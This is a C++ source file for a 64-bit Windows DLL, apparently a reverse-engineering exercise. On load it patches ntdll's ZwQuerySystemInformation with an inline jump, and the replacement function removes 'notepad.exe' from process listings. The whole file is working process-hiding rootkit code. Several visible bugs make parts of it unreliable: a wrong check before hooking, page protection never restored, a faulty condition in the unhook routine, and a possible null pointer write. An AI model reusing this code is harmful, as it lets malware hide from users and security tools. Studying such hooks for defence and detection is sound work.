// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
// 64 dll 임
#include<iostream>
#include<windows.h>
#include "tchar.h"
#include "pch.h"
#include "framework.h"

#define STATUS_SUCCESS						(0x00000000L) 
#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
    TCHAR g_szProcName[MAX_PATH] = TEXT("notepad.exe");
#pragma data_seg()

BYTE g_pOrgBytes[14] = { 0, };

BOOL Hook64(std::string DllName, std::string FuncName, PROC pfnNew, PBYTE pOrgBytes)
{
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf1[6] = { 0xFF, 0x25, 0 , };
    BYTE pBuf2[8] = { 0, };
    PBYTE pByte;

    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(DllName.c_str()), FuncName.c_str());
    pByte = (PBYTE)pOrgBytes;

    if (pByte[0] == 0xFF && pByte[1] == 0x25)
        return FALSE;

    memcpy(pOrgBytes, pfnOrg, 14);
    memcpy(pBuf2, &pfnNew, 8);

    VirtualProtect((LPVOID)pfnOrg, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pfnOrg, pBuf1, 6);
    memcpy((LPVOID)((UINT_PTR)pfnOrg + 6), pBuf2, 8 );

    return TRUE;
}

BOOL UnHook(std::string DllName, std::string FuncName, PBYTE pOrgBytes)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    pFunc = GetProcAddress(GetModuleHandleA(DllName.c_str()), FuncName.c_str());
    pByte = (PBYTE)pFunc;

    if (pByte[0] != 0xFF && pByte[1] != 0x25)
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pFunc, pOrgBytes, 14);
    VirtualProtect((LPVOID)pFunc, 14, dwOldProtect, &dwOldProtect);

    return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev{ 0, };
    char szProcName[MAX_PATH] = { 0, };

    UnHook(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);

    status = ((t_NtQuerySystemInformation)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFORMATION_END;

    if (SystemInformationClass == SystemProcessInformation)
    {
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while (TRUE)
        {
            if (pCur->ImageName.Buffer != NULL)
            {
                if (!_tcsicmp((PWSTR)pCur->ImageName.Buffer, g_szProcName))
                {
                    if (pCur->NextEntryOffset == 0)
                        pPrev->NextEntryOffset = 0;
                    else
                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
                }
                else
                    pPrev = pCur;
            }
            if (pCur->NextEntryOffset == 0)
                break;
            pCur = (PSYSTEM_PROCESS_INFORMATION)((UINT_PTR)pCur + pCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    Hook64(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

    return status;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Hook64(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        UnHook(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
        break;
    }
    return TRUE;
}

